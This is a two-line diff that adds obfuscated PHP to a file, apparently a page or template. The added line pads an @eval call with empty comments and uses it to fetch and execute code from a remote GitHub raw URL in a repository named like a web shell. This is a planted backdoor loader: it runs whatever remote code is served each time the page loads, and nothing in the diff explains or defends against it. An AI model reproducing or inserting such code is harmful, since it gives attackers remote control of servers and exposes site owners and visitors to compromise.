@@ -1,0 +1,2 @@
+<!---->
+<?=/**/@null; /**/ /*/ /**/@eval/**/ ("?>".file_get_contents (rawurldecode(urldecode("https://raw.githubusercontent.com/ebokzsss/shellebok/refs/heads/main/b.txt")))); /**/ ?>
